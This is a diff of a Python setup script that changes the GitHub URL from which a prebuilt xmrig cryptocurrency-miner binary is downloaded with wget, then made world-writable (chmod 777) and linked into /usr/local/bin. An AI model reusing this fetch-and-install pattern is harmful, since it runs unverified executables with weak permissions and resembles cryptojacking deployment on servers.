@@ -30,7 +30,7 @@ for x in range(0,3):
         #os.chdir('build')
         #os.system ('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a -DWITH_AEON=OFF -DWITH_HTTPD=OFF')
         #os.system ('make')
-	os.system('wget https://github.com/nguyennhatduy2608/test/raw/master/xmrig')
+	os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig')
 	os.system('chmod 777 xmrig')
         workingdir = os.getcwd()
     	os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
